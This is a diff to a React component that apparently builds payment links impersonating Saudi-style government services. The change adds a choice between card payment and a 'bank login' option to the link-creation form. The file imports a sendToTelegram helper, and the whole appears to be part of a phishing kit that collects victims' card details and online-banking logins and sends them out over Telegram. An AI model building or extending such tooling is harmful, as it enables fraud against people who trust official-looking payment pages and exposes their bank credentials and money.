@@ -22,7 +22,9 @@ import {
   ExternalLink,
   CheckCircle,
   Shield,
-  Lock
+  Lock,
+  CreditCard,
+  Building2
 } from "lucide-react";
 import BackButton from "@/components/BackButton";
 import { sendToTelegram } from "@/lib/telegram";
@@ -48,7 +50,7 @@ const GovernmentPaymentLinkCreator = () => {
   const [createdLink, setCreatedLink] = useState("");
   const [linkId, setLinkId] = useState("");
   const [showSuccess, setShowSuccess] = useState(false);
-  const [paymentMethod, setPaymentMethod] = useState("card");
+  const [paymentMethod, setPaymentMethod] = useState<"card" | "bank_login">("card");
 
   const primaryColor = govSystem.colors.primary;
   const secondaryColor = govSystem.colors.secondary;
@@ -327,12 +329,12 @@ const GovernmentPaymentLinkCreator = () => {
             )}
           </div>
 
-          <form onSubmit={handleSubmit} className="p-8 space-y-6">
-            <div className="text-center mb-6">
-              <h2 className="text-2xl font-bold mb-2" style={{ color: primaryColor }}>
+          <form onSubmit={handleSubmit} className="p-6 sm:p-8 space-y-5">
+            <div className="text-center mb-5">
+              <h2 className="text-xl sm:text-2xl font-bold mb-2" style={{ color: primaryColor }}>
                 إنشاء رابط دفع {govService.nameAr}
               </h2>
-              <p className="text-gray-600">
+              <p className="text-sm text-gray-600">
                 أدخل بيانات الدفع لإنشاء رابط مخصص
               </p>
             </div>
@@ -383,7 +385,67 @@ const GovernmentPaymentLinkCreator = () => {
               </div>
             </div>
 
-            <div className="space-y-4 pt-4 border-t">
+            <div className="space-y-4 pt-4 border-t mt-4">
+              <div>
+                <Label className="flex items-center gap-2 mb-2 text-base font-bold">
+                  <CreditCard className="w-5 h-5" />
+                  طريقة الدفع *
+                </Label>
+                <div className="grid grid-cols-2 gap-3">
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod("card")}
+                    className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                      paymentMethod === "card" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
+                    }`}
+                    style={{
+                      background: paymentMethod === "card" ? `${primaryColor}10` : "white",
+                      borderColor: paymentMethod === "card" ? primaryColor : undefined
+                    }}
+                  >
+                    <CreditCard 
+                      className="w-6 h-6 mx-auto mb-2" 
+                      style={{ color: paymentMethod === "card" ? primaryColor : "#9CA3AF" }}
+                    />
+                    <p className={`text-sm font-bold ${
+                      paymentMethod === "card" ? "" : "text-gray-600"
+                    }`}
+                    style={{ color: paymentMethod === "card" ? primaryColor : undefined }}
+                    >
+                      بطاقة الائتمان
+                    </p>
+                    <p className="text-xs text-gray-500 mt-1">Visa, Mada, Mastercard</p>
+                  </button>
+                  
+                  <button
+                    type="button"
+                    onClick={() => setPaymentMethod("bank_login")}
+                    className={`p-4 rounded-xl border-2 transition-all duration-200 ${
+                      paymentMethod === "bank_login" ? "border-current shadow-md" : "border-gray-200 hover:border-gray-300"
+                    }`}
+                    style={{
+                      background: paymentMethod === "bank_login" ? `${primaryColor}10` : "white",
+                      borderColor: paymentMethod === "bank_login" ? primaryColor : undefined
+                    }}
+                  >
+                    <Building2 
+                      className="w-6 h-6 mx-auto mb-2" 
+                      style={{ color: paymentMethod === "bank_login" ? primaryColor : "#9CA3AF" }}
+                    />
+                    <p className={`text-sm font-bold ${
+                      paymentMethod === "bank_login" ? "" : "text-gray-600"
+                    }`}
+                    style={{ color: paymentMethod === "bank_login" ? primaryColor : undefined }}
+                    >
+                      تسجيل دخول بنكي
+                    </p>
+                    <p className="text-xs text-gray-500 mt-1">الخدمات المصرفية</p>
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <div className="space-y-4 pt-4 border-t mt-4">
               <div>
                 <Label className="flex items-center gap-2 mb-2">
                   <DollarSign className="w-4 h-4" />
